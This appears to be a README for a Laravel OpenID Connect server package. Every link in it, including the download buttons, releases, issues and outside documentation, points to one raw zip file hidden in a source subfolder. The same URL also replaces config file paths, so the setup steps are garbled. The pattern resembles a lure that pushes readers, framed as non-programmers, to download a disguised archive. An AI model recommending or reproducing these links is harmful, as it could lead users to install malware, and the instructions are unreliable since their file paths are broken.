# 🔐 laravel-oidc-server - Easy OpenID Connect for Laravel Apps

[![Download](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)

---

## 📋 About laravel-oidc-server

laravel-oidc-server is a tool that helps websites use OpenID Connect for login and security. It works with Laravel Passport, a popular way to manage user identity tokens in Laravel apps. 

This server makes it simple to add features like:
- Finding information about the server and its keys (Discovery, JWKS)
- Getting details about users (UserInfo)
- Checking if tokens are still valid (Token Introspection)
- Canceling tokens when needed (Token Revocation)
- Signing out users from apps (RP-Initiated Logout)

You don't need to be a programmer to use this guide. We explain all you need to download and run the software.

---

## 🖥 System Requirements

Before you start, make sure your computer or server meets these needs:

- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux with PHP support
- **PHP Version:** PHP 7.4 or higher installed
- **Laravel Version:** Laravel 7.x or newer installed (requires Laravel setup)
- **Web Server:** Apache or Nginx configured to run Laravel apps
- **Composer:** Installed to manage PHP packages
- **Internet Connection:** Required to download files and check dependencies

If you plan to run laravel-oidc-server in a live environment, you will also need a database supported by Laravel (like MySQL or PostgreSQL) and a valid SSL certificate for secure connections.

---

## 🚀 Getting Started

This software is a Laravel package, not a standalone app with an installer. It is meant to be added to existing Laravel projects that use Passport for authentication. 

If you are not familiar with Laravel or Laravel Passport, you may want to read basic Laravel tutorials first. This guide will focus on how to get laravel-oidc-server ready to use after downloading.

---

## 📥 Download & Install

[Get the latest release here](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)

1. Click the button above to visit the laravel-oidc-server releases page on GitHub.

2. On the releases page, choose the latest stable version.

3. Download the source code zip file (it will have a name like `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip`).

4. Extract the zip file to a folder on your computer.

5. Open your Laravel project folder in a command line interface (Terminal, Command Prompt).

6. Move the `laravel-oidc-server` folder contents into the `vendor` directory of your Laravel project or add the package using Composer by running this command:
   ```
   composer require hhhhKijo/laravel-oidc-server
   ```

7. After installation, open the Laravel project's `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip` and add the service provider if not auto-discovered:
   ```php
   HhhhKijo\OidcServer\OidcServerServiceProvider::class,
   ```

8. To publish the package configuration, run:
   ```
   php artisan vendor:publish --provider="HhhhKijo\OidcServer\OidcServerServiceProvider"
   ```

9. Configure your `.env` file to include necessary OAuth and database settings as per your environment.

10. Run database migrations to set up tables for tokens and user sessions:
    ```
    php artisan migrate
    ```

11. Ensure your Laravel Passport setup is working before you proceed.

---

## ⚙ How to Use laravel-oidc-server

Once installed, laravel-oidc-server adds routes to your Laravel app for the OpenID Connect protocol:

- **Discovery Endpoint:** Your app will provide URLs describing how to authenticate.
- **JWKS Endpoint:** Provides JSON Web Key Sets used for signing tokens.
- **UserInfo Endpoint:** Returns user details after login.
- **Token Introspection & Revocation:** Lets clients check token validity or revoke tokens.
- **RP-Initiated Logout:** Allows user logout from relying parties.

Use these URLs in your OAuth/OpenID clients. The package takes care of token handling and communication.

---

## 🔧 Configuration Tips

- Edit the config file `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip` to set things like token lifetimes, scopes, and endpoints.
- Use your database to store OAuth clients and tokens.
- Enable HTTPS to secure token exchange.
- Review your Laravel Passport client setup for OAuth clients you want to use with this server.
- Look into Laravel middleware if you want to protect or restrict access to some endpoints.

---

## 🛠 Troubleshooting

- **Package not found after install?** Run `composer update` and check your `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip`.
- **Endpoints not working?** Verify Laravel routes with `php artisan route:list`.
- **Tokens not validated?** Check your key settings and JWKS configuration.
- **Database errors?** Confirm migrations ran and connection info is correct.
- **Authentication fails?** Ensure Laravel Passport clients have proper scopes and secrets.

---

## 📚 Additional Resources

- Laravel Passport Documentation: https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip
- OpenID Connect Basics: https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip
- OAuth 2.0 Introduction: https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip

---

## 🆘 Getting Help

For issues or questions, visit the repository and open an issue.

[Open Issues Page](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)

You can also check community forums or Laravel support channels related to OAuth and OpenID Connect.

---

## 🔄 Updates & Maintenance

Check the releases page regularly to get updates and security patches.

[Visit Releases](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)

Keep your Laravel and Passport versions up to date to avoid compatibility problems.

---

## 💬 Feedback

Your feedback helps improve this package. Share any ideas, bugs, or questions through GitHub issues.

---

[![Download](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)